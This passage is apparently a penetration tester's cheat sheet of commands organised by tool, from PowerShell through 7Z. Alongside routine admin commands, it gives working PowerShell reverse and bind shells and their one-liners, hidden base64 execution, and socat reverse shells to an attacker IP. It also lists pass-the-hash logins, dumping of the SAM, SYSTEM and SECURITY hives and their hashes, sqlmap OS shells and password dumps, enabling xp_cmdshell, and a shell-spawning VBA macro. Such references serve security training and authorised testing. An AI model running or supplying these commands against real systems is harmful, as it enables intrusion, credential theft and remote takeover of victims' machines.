New-PSDrive -Name "drive_name_here" -PSProvider "FileSystem" -Root "\\IP_here\share_name_here"

# enable SMBv1
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All

# check process architecture
[Environment]::Is64BitProcess

# check OS architecture
[Environment]::Is64BitOperatingSystem

# list all processes
Get-Process

# compress .zip (<= powershell 5.0)
Compress-Archive -LiteralPath C:\path\to\files -DestinationPath C:\path\to\out.zip

# uncompress .zip (<= powershell 5.0)
Expand-Archive -LiteralPath C:\path\to\zip -DestinationPath C:\path\to\out\folder
# uncompress .zip (<= .NET 4.5+)
Add-Type -AssemblyName System.IO.Compression.FileSystem
function unzip {param( [string]$ziparchive, [string]$extractpath );[System.IO.Compression.ZipFile]::ExtractToDirectory( $ziparchive, $extractpath )}
unzip "C:\path\to\zip" "C:\path\to\out\folder"

# view file permissions
dir | Get-ACL

# reverse shell
$client = New-Object System.Net.Sockets.TCPClient('IP_here',port_here);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
  $sendback = (IEx $data 2>&1 |Out-String);
  $prompt = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($prompt);
  $stream.Write($sendbyte, 0, $sendbyte.Length);
  $stream.Flush();
}
$client.Close();

# reverse shell one-liner
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP_here',port_here);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (IEx $data 2>&1 |Out-String);$prompt = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($prompt);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush();}$client.Close()"

# bind shell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
  $sendback = (IEx $data 2>&1 |Out-String);
  $prompt = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($prompt);
  $stream.Write($sendbyte, 0, $sendbyte.Length);
  $stream.Flush();
}
$client.Close();
$listener.Stop();

# bind shell one-liner
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (IEx $data 2>&1 |Out-String);$prompt = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($prompt);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush();}$client.Close();$listener.Stop()"

# run base64-encoded command
powershell -e base64_payload_here

# run base64-encoded command without popping window
powershell -e base64_payload_here -w hidden

# run base64-encoded command without popping window or loading user profile
powershell -e base64_payload_here -w hidden -nop

# base64 encode file
# read file content into variable
$content = Get-Content /path/to/file
# read bytes into variable
$bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
# base64 encode bytes
[Convert]::ToBase64String($bytes)

# base64 decode file
[Convert]::FromBase64String("base64_string_here")

# run as other user
powershell -c "$username = 'user_name_here'; $passwd = 'password_here';$secpasswd = ConvertTo-SecureString $passwd -AsPlainText -Force; $mycreds = New-Object System.Management.Automation.PSCredential $username,$secpasswd; Start-Process C:\path\to\shell.exe -Credential $mycreds"
```



## POWERUP
```powershell
# run PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks
```



## PTH-TOOLKIT
```bash
# authenticate to SMB with pass-the-hash + execute command
pth-winexe -U domain_here/user_name_here%LM+NTLM_hash_here //SMB_share_here command_here
```



## PYTHON & PYTHON3
```python
# user python path from env
#!/usr/bin/env python
#!/usr/bin/env python3

# HTTP server
python -m SimpleHTTPServer 80
python3 -m http.server 80

# concatenate characters + bytes (BOF)
print(b'char_here' * factor_here + b'\xbyte_here\xanother_byte_here')

# interact with executable - run and attach proces
io = process("/path/to/executable/here")

# interact with executable - attach to remote server
io = remote("server_IP_here", port_here)

# interact with executable - send data
io.sendlineafter("last_char/string_received ","char/string_to_send")

# interact with executable - receive data
io.recvline()
io.recvline().strip()
io.recvline().strip().split()
io.recvline().strip().split()[-1]

# interact with executable - get interactive prompt
io.interactive()

# create cyclic string
from pwn import *
cyclic(length_here)

# find substring in cyclic string
cyclic_find("substring_here")

# read file line per line
with open("file_name_here","mode_here",encoding="encoding_here") as file:
  for line in file:
    do_something

# upgrade shell
python -c 'import pty;pty.spawn("/bin/bash")'
```



## RADARE2
```bash
# open binary in debug mode
r2 -d /path/to/binary

# analyze all symbols and entry points in binary (after opening in debug mode)
aa

# output help
?
?command_here

# list all functions
afl

# print function disassembly code
pdf @function_name_here

# set breakpoint
db instruction_address_here

# run program until breakpoint
dc

# print variable content
px @variable_address

# execute next instruction
ds

# print content of registers
dr

# reload program
ood
```



## RDESKTOP
```bash
# connect to rdp machine
rdesktop IP_here
```



## RECON-NG
```bash
# search modules
marketplace search keyword_here

# display module info
marketplace info module_name_here
info

# install module
marketplace install module_name_here

# load module
modules load module_name_here

# display stored hosts
show hosts
```



## REG
```powershell
# enumerate registry information, search recursively for password in HKLM
reg query HKLM /f password /t REG_SZ /s

# enumerate registry information, search recursively for password in HKCU
reg query HKCU /f password /t REG_SZ /s

# create copy of SYSTEM
reg save HKLM\SYSTEM C:\path\to\copy\location\SYSTEM.save

# create copy of SAM
reg save HKLM\SAM C:\path\to\copy\location\SAM.save

# create copy of SECURITY
reg save HKLM\SECURITY C:\path\to\copy\location\SECURITY.save
```



## RINETD
```bash
# configure port forwarding rule for target on proxy
## open config file
sudo nano /etc/rinetd.conf 
## bindadress    bindport  connectaddress  connectport
0.0.0.0 listening_port_on_proxy dest_IP dest_port
## restart service
sudo service rinetd restart
## verify listener
ss -plant | grep listening_port_on_proxy
## connect to destination from target
nc -nvv proxy_IP_here listener_port_here
```



## RLWRAP
```bash
# wrap line on listener
rlwrap nc -lnvp port_here
```



## RPCBIND
```bash
# enumerate rpcbind
rpcinfo IP_here

# nmap
nmap -sSUC -p 111 IP_here

# show export list for NFS server
showmount -e IP_here
nmap -sV --script=nfs-showmount IP_here

# mount NFS share
mkdir mounted_share
sudo mount -o nolock IP_here:/share_name_here /path/to/mounted_share/
sudo mount -o nolock,vers=3 IP_here:/share_name_here /path/to/mounted_share/
```



## RPCCLIENT
```bash
# connect anonymously
rpcclient -U "" IP_here
rpcclient -U "" -N IP_here

# connect as user
rpcclient -U username%password IP_here

# find domain name
querydominfo

# domain look-up
lookupdomain domain_here

# enumerate domain users / find RID
enumdomusers

# whoami
getusername

# display description fields
querydispinfo
querydispinfo2
querydispinfo3

# enumerate registry keys
winreg_enumkey key_name_here
querymultiplevalues key_name_here value_here som_other_value_here
querymultiplevalues2 key_name_here value_here som_other_value_here

# read eventlog
eventlog_readlog offset_here no_bytes_here

# backup eventlog file
eventlog_backuplog log_name_here backup_name_here

# get eventlog info
eventlog_loginfo log_name_here

# get WKSSVC computer names
wkssvc_enumeratecomputernames

# get WKSSVC users
wkssvc_enumerateusers

# enumerate DFS shares
dfsenum
dfsenumex share_name_here

# get DFS share info
dfsgetinfo path_here server_name_here share_name_here

# get server info
srvinfo

# enumerate shares
netshareenum
netshareenumall

# get share info
netsharegetinfo share_name_here

# enumerate files on share
netfileenum

# get file security on share
netfilegetsec

# enumerate sessions
netsessenum

# enumerate disks
netdiskenum

# enumerate connections
netconnenum

# get DC
getanydcname domain_here
getdcname
dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2

# get DC info
dsgetdcinfo

# get forest trust info
dsr_getforesttrustinfo

# enumerate trusted domains
dsr_enumtrustdom
dsenumdomtrusts
netrenumtrusteddomains
netrenumtrusteddomainsex
enumtrust

# enumerate domains
enumdomains

# logongetdomaininfo (attempts to open /var/lib/samba/private/secrets.tdb)
logongetdomaininfo

# sam lookup
samlookupnames builtin name_here another_name_here
samlookupnames domain name_here another_name_here
samlookuprids

# convert SID to name
lookupsids
lookupsids3
lookupsids_level

# convert name to SID
lookupnames user_name_here
lookupnames4 user_name_here
lookupnames_level

# enumerate privileges
enumprivs
getdispname privilege_name_here
lsaenumprivsaccount SID_here
lsaenumacctrights SID_here

# get user alias
queryuseraliases builtin SID_here
queryuseraliases domain SID_here
```



## RTSP
```
# establish connection
nc -nv IP_here 554
nc -nvC IP_here 554

# send DESCRIBE request - e.g. determine auth / unauth access
DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\n\r\n
```



## RUBY
```ruby
# HTTP server
ruby -run -e httpd -p port_here
```



## RUSERS
```bash
# show logged in users
rusers -l IP_here
```



## SAMDUMP2
```bash
# dump hashes from SYSTEM + SAM
samdump2 /path/to/copy/of/system /path/to/copy/of/sam
```



## SC
```
# show service config
sc.exe qc service_name_here

# get service state
sc.exe query service_name_here

# start service
sc.exe start service_name_here
net start service_name_here

# stop service
sc.exe stop service_name_here

# change service config : change START_TYPE to AUTOMATIC / AUTO_START
sc.exe config service_name_here start= auto
```



## SCP
```bash
# copy remote file to local machine
scp user@IP_here:/path/to/remote/file /path/to/local/file

# copy local file to remote machine
scp /path/to/local/file user@IP_here:/path/to/remote/file

# authenticate with ssh key + copy remote file to local machine
scp -i private_key_here user@IP_here:/path/to/remote/file /path/to/local/file

# authenticate with ssh key + copy local file to remote machine
scp -i private_key_here /path/to/local/file user@IP_here:/path/to/remote/file 
```



## SEARCHSPLOIT
```bash
# display full path + URL to exploit
searchsploit -p short_path_here

# exclude term from search
searchsploit --exclude="term_here"

# search exploit
searchsploit search_term1_here search_term2_here

# view exploit
searchsploit -x short_path_here

# copy exploit to current working directory
searchsploit -m short_path_here

# update searchsploit
sudo apt install exploitdb # package + db
searchsploit -update # db
```



## SEATBELT
```powershell
# run Seatbelt.exe
.\Seatbelt.exe all

# run specific checks
.\Seatbelt.exe check_here another_check_here
```



## SED
```bash
# delete spaces from string
echo "my string with spaces here" | sed -r 's/( )+//g'

# replace word_here in output stream
echo "something with a specific word_here" | sed 's/word_here/new_word_here/'

# change UID
sudo sed -i -e 's/old_UID/new_UID/g' /etc/password

# print lines between begin_pattern and end_pattern from file
sed -n '/begin_pattern/,/end_pattern/p' filename_here
```



## SFTP
```bash
# connect as user
sftp -oPort=port user@IP_here

# upload file
put /path/to/local/file [/path/remote]

# download file
get /path/to/remote/file
```



## SIPVICIOUS
```bash
# enumerate SIP servers
svmap IP_range_here

# enumerate valid extensions for SIP endpoints
svwar -m INVITE IP_here
```



## SMB
```bash
# enumerate shares / services with anonymous login
smbclient //IP_here/IPC$ -N
smbmap -H IP_here
crackmapexec smb IP_here --shares
smbclient -L netbios_name_here -N
smbclient -L netbios_name_here -I IP_here -N
nmap --script=smb-enum-shares IP_here

# enumerate smb shares / services as user_here
smbclient -L netbios_name_here -U user_name_here
smbclient -L netbios_name_here -I IP_here -U user_name_here
smbmap -u user -p password -d domain_here -H IP_here
crackmapexec smb IP_here -u user -p password --shares

# enumerate shares with ntlm password hash
smbclient -L netbios_name_here  --pw-nt-hash -I IP_here -U user_name_here%password_hash_here

# recursively list share content + permissions for null session
smbmap -R share_here -H IP_here

# recursively list share content + permissions for user_here
smbmap -R share_here -H IP_here -d domain_here -u user_here -p password_here

# connect to a directory on a share as username
smbclient \\\\IP_here\\some_share -D some_folder -U username%password

# smbclient - upload file
put /path/to/local/file [/path/remote]

# upload file
smbmap -R share_here -H IP_here --upload /path/to/file

# download file
smbmap -R share_here -H IP_here --download /path/to/file

# smbclient - download file
get /path/to/remote/file

# recursiveley download files
smbmap -R share_name_here -H IP_here -A '.*'

# smbclient - bulk download every file on share
mask ""
recurse ON
prompt OFF
mget *

# read file
more filename_here

# mount smb share
sudo mount -t cifs -o 'user=user_here,password=password_here' //IP_here/share_here /path/to/mountpoint

# execute command
smbmap -u user_name_here -p 'password_here' -d domain_here -H IP_here -x 'command_here'
```



## SMTP
```bash
# connect to SMTP
nc -nv IP_here 25
telnet IP_here 25

# list commands
nmap --script smtp-commands IP_here -p 25

# identify server
HELO hostname_here
EHLO hostname_here

# verify email
VRFY user_name_here
```



## SNMP-CHECK
```
# enumerate SNMP port 161 with community string "public"
snmp-check IP_here
snmp-check IP_here -p 161 -c public
```



## SNMPSET
```
# write test : change sysName to test 
snmpset -c public -v1 IP_here MIB_here s "test"
```



## SNMPWALK
```bash
# enumerate MIB tree
snmpwalk -c community_string_here -v snmp_version_here -t time_out_in_seconds_here IP_here

# enumerate specific MIB value
snmpwalk -c community_string_here -v snmp_version_here -t time_out_in_seconds_here IP_here MIB_here
```



## SOCAT
```bash
# connect to TCP port
socat -TCP4:target_IP:port_here

# listen
socat TCP4-LISTEN:port_here STDOUT

# share file
socat TCP4-LISTEN:port_here,fork file:infile_here

# retrieve file
socat TCP4:target_IP:port_here file:outfile_here,create

# reverse shell
## listener
socat -d -d TCP4-LISTEN:port_here STDOUT
## push shell
socat TCP4:attacker_IP:port_here EXEC:/bin/bash

# encrypted bind shell
## genereate self-signed cert
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 363 -out shell.crt
## combine cert + private key into .pem
cat shell.key shell.crt > shell.pem
## set up listener on target, no SSL cert validation
socat OPENSSL-LISTENER:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
## connect from attacker machine
socat - OPENSSL:target_IP:443,verify=0
```



## SQL
```sql
# determine no. of columns in table : (error - 1) =  no_columns
ORDER BY increasing_no_here

# return no_here columns
LIMIT no_here

# identify displayed columns
UNION ALL SELECT 1,2,...,no_columns_here

# wildcard
%

# ASCII math = 2
67-ASCII('A')
51-ASCII(1)

# fingerprint database
## strings
'wurzel'||'sepp' # Oracle
'wurzel'+'sepp' # MSSQL
'wurzel' 'sepp' # MySQL

## numeric data : 0 on target db, error on any other db
BITAND(1,1)-BITAND(1,1) # Oracle
@@PACK_RECEIVED-@@PACK_RECEIVED # MSSQL
CONNECTION_ID()-CONNECTION_ID() # MySQL
```



## SQLITE3
```bash
# display database content
sqlite3 database_here .dump
.dump

# list tables
.tables

# show column names
.headers on

# save output in file
.output file_name_here

# quit sqlite3 shell
.quit

# display help
.help

# print column names
.schema table_name_here
```



## SQLMAP
```python
# launch sqlmap from a GET / POST request file
python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3

# set dbms
python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3 --dbms=DBMS_here

# list available tampers
python /path/to/sqlmap --list-tampers

# try to priv esc !!risk=3 might damage db!!
python /path/to/sqlmap -r req.txt -p param_to_attack --level=1 --risk=3 --privesc

# dump database
python /path/to/sqlmap -r req.txt -p param_to_attack --dump

# execute command
python /path/to/sqlmap -r req.txt -p param_to_attack --os-cmd=command_here

# upload shell to target + get command prompt
python /path/to/sqlmap -r req.txt -p param_to_attack --os-shell

# designate injection point in request file : *
{"template":"{\"name\":\"123*\"}"}

# increase timeout (default: 30)
python /path/to/sqlmap -r req.txt -p param_to_attack --timeout=300

# techniques
## B = boolean-based blind
## E = error-based
## U = union query-based
## S = stacked queries
## T = time-based blind
## Q = inline queries
--technique BEUSTQ

# check which users webapp runs as
python /path/to/sqlmap -r req.txt --curent-user

# if run as root, dump password hashes for DB
python /path/to/sqlmap -r req.txt --passwords

# file read
python /path/to/sqlmap -r req.txt --file-read '/path/to/file/here'
```



## SQSH
```bash
# connect to SQL database
sqsh -S IP_here -U user_here -P password_here

# sqsh - execute command on server
xp_cmdshell 'command_here'
go

# sqsh - turn on componant for xp_cmdshell (needs admin privs)
EXEC SP_CONFIGURED 'show advanced options',1
EXEC SP_CONFIGURE 'xp_cmdshell',1
reconfigure
go
```



## SSH
```bash
# connect as user with password
ssh user@IP_here

# connect as user with password on port
ssh user@IP_here -p port_here

# connect as user with private key
ssh -i private_key user@IP_here

# create key pair
ssh-keygen

# port forwarding
ssh -N -L local_port_to_forward_from:IP_here:port_to_forward_to

# port forwarding / tunnel through proxy
ssh -N -L 0.0.0.0:local_port_to_forward_from:target_IP_here:target_port_to_forward_to user@proxy_IP_here

# port forwarding - forward to victim via ssh to get access to services listening on localhost
ssh -R local_attacker_port_here:127.0.0.1:target_port_here username_here@local_attacker_machine_here

# key exchange error
ssh -oKexAlgorithms=proposed_algorithm_here user@IP_here

# force use of legacy crypto, e.g. DSA
ssh -o PubKeyAcceptedKeyTypes=ssh-dss

# start service
sudo systemctl start ssh

# stop service
sudo systemctl stop ssh

# start service at boot time
sudo systemctl enable ssh

# disable service start at boot time
sudo systemctl disable ssh

# check for running service
sudo ss -plant | grep ssh
```



## SSHUTTLE
```bash
# forward all traffic
sshuttle -r user_name_here@IP_SSH_server_here 0.0.0.0/0

# forward all traffic + proxy DNS requests to remote SSH server
sshuttle --dns -r user_name_here@IP_SSH_server_here 0.0.0.0/0

# forward all traffic + exclude pivoting IP from forwarding
sshuttle -r user_name_here@IP_SSH_server_here -x SSH_IP_here 0.0.0.0/0
```



## SVN
```bash
# download repository
svn co svn://url_here

# show commit history
svn log

# revert to specific revision
svn up -r revision_number_here
```



## SYSTEMCTL
```bash
# start service
sudo systemcctl start service_name_here

# stop service
sudo systemctl stop service_name_here

# start service at boot time
sudo systemctl enable service_name_here

# disable service start at boot time
sudo systemctl disable service_name_here

# check for running network service
sudo ss -plant | grep service_name_here

# list available services
sudo systemctl list-unit-files
```



## TCPDUMP
```bash
# list all interfaces
tcpdump -D

# monitor connections on interface
tcpdump -i interface_here

# monitor specific src and / or dst IP
tcpdump -i interface_here src IP_here and dst IP_here

# monitor specific dst IP and port
tcpdump -i interface_here dst IP_here and port port_here

# listen for ping
tcpdump -i interface_here icmp
tcpdump -i interface_here icmp and icmp[icmptype]=icmp-echo

# read .pcap
sudo tcpdump -r filename_here.pcap

# read .pcap + filter for src_IP
sudo tcpdump -n src src_IP_here -r filename_here.pcap

# read .pcap + filter for dst_IP
sudo tcpdump -n dst dst_IP_here -r filename_here.pcap

# read .pcap + filter for port
sudo tcpdump port port_here -r filename_here.pcap

# dump capture data (hex + ASCII)
sudo tcpdump -nX -r filename_here.pcap

# filter for packets with ACK + PSH flag
sudo tcpdump -A -n 'tcp[13] = 24' -r filename_here.pcap
sudo tcpdump -A -n 'tcp[tcpflags] & tcp-push != 0 & tcp-act != 0'
```



## THE HARVESTER
```bash
# harvest data about domain from data_source
theHarvester -d domain_here -b data_source_here
```



## TMUX
```bash
# start new session
tmux new -s session_name_here

# start logging (requires tmux-logging plugin)
prefix + shift + p

# log pane history (requires tmux-logging plugin)
prefix + alt + shift + p

# detach session
prefix + d

# reattach session
tmux attach -d -t session_name_here
tmux attach -d -t session_id_here
```



## TNSCMD
```bash
# ping Oracle TNS listener
tnscmd10g -h IP_here -p 1521

# dump debug info into listener log
tnscmd10g debug -h IP_here -p 1521
tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=debug))"

# reload config file for listener
tnscmd10g reload -h IP_here -p 1521
tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=reload))"

# save config file for listener
tnscmd10g save_config -h IP_here -p 1521
tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=save_config))"

# dump service data
tnscmd10g service -h IP_here -p 1521
tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=service))"

# retrieve status
tnscmd10g status -h IP_here -p 1521
tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=status))"

# shut down listener
tnscmd10g stop -h IP_here -p 1521
tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=stop))"

# enumerate version
tnscmd10g version -h IP_here -p 1521
tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=version))"
```



## TR
```bash
# replace newline with space
tr '\n' ' '
tr '\n' ' ' < /path/to/in/file
tr '\n' ' ' < /path/to/in/file > /path/to/out/file

# delete newline
tr -d '\n'
tr -d '\n' < /path/to/in/file
tr -d '\n' < /path/to/in/file > /path/to/out/file

# delete CR (e.g. Win file to Unix)
tr -d '\r' < /path/to/win_file/here > /path/to/unix_file/here

# replace LF with CR (e.g. Unix to Mac)
tr '\n' '\r' < /path/to/unix_file/here > /path/to/mac_file/here

# replace CR with LF (e.g. Mac to Unix)
tr '\r' '\n' < /path/to/mac_file/here > /path/to/unix_file/here
```



## UPX
```bash
# compress + pack executable
upx -9 binary-here
```



## URL-ENCODING
```
# &
%26

# ?
%3f

# =
%3d

# <space>
+
%20

# <CR>
%0d

# <LF>
%0a

# +
%2b

# ;
%3b

# /
%2f
```



## VBA
```vba
# shell spawning macro snippet
Sub Macro_name_here()
' some comment here
    CreateObject("WScript.Shell").Run "cmd"
End Sub
```



## VIEWGEN
```bash
# guess signature + encryption
viewgen --guess "viewstate_here"
```



## VIM
```
# jump to line
:line_number_here

# type =/=
!=
```



## VIMDIFF
```
# pop changes from 1st window into 2nd
dp

# pops changes from 2nd window into 1st
do

# jump to next change
]c

# jump to previous change
[c

# switch to other window
Ctrl+w
```



## VIRTUALENV
```bash
# initialize virtual environment
virtualenv venv

# initialize virtual environment with specific python version as target interpreter
virtualenv --python=pythonversion_here venv

# activate virtual environment
## Linux
source venv/bin/activate
## Win
. venv/Scripts/activate

# deactivate virtual environment
deactivate

# delete virtual environment
## Linux
rm -rf venv
## Win
del venv
```



## VNCVIEWER
```
# connect to VNC
vncviewer IP_here::5900
```



## WES-NG (Windows Exploit Suggester - Next Generation)
```
# update WES-NG
/path/to/wes.py --update
```



## WFUZZ
```
# fuzz url
wfuzz -c -z file,/path/to/wordlist/here URL_here/FUZZ
wfuzz -c -w /path/to/wordlist/here URL_here/FUZZ
```



## WGET
```bash
# retrieve folders + files from FTP
wget --mirror 'ftp://user_here:password_here@hostname.domain'
wget --mirror 'ftp://user_here:password_here@IP_here'

# recursively retrieve folders + files from FTP
wget -r 'ftp://user_here:password_here@IP_here'

# download file from FTP / HTTP / HTTPS
wget -O /path/to/outfile url_here
```



## WHATWEB
```bash
# run scan
whatweb url_here

# run aggressive scan
whatweb -a=3 url_here
```



## WINEXE
```powershell
# get shell on IP_here as user with password
winexe -U domain_here/user_here%password_here cmd.exe

# get shell on IP_here as user with lm:ntlm hash
pth-winexe -U domain_here/user_here cmd.exe
```



## WPSCAN
```bash
# scan wordpress
wpscan --url url_here --enumerate ap,at,cb,dbe
```



## XFREERDP
```bash
# establish connection
xfreerdp /u:user_here /p:password_here /cert:ignore /v:IP_here
```



## XMLRPC
```
# list methods - POST
<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
    <params>
      <param>
      </param>
    </params>
</methodCall>

# general syntax - POST
<?xml version="1.0"?>
<methodCall>
  <methodName>method_name_here</methodName>
    <params>
      <param>
        <value>some_value_here</value>
      </param>
      <param>
        <value><int>another_value_here</int></value>
      </param>
      <param>
        <value><string>some_url:port_here</string></value>
      </param>
    </params>
</methodCall>
```



## XPROBE2
```
# probe service on remote host for OS
xprobe2 -v -p tcp:port_here:open IP_here
```



## XXD
```bash
# plaintext hexdump
xxd -p filename_here
```



## 7Z
```bash
# extract password-protected archive (special characters in password need to be escaped with \)
7z e archive_here.zip -ppassword_here 

```
